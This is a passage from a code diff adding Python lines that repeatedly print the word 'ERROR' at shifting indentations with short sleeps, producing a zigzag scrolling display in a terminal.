+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
+          time.sleep(0.001)
+          print("                  ERROR")    
+          time.sleep(0.001)
+          print("            ERROR") 
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001) 
+          print("ERROR")
+          time.sleep(0.001)
+          print("ERROR")
+          time.sleep(0.001)
+          print("      ERROR")
+          time.sleep(0.001)
+          print("             ERROR")
+          time.sleep(0.001)
+          print("                  ERROR")        
+          time.sleep(0.001)
+          print("                       ERROR")    
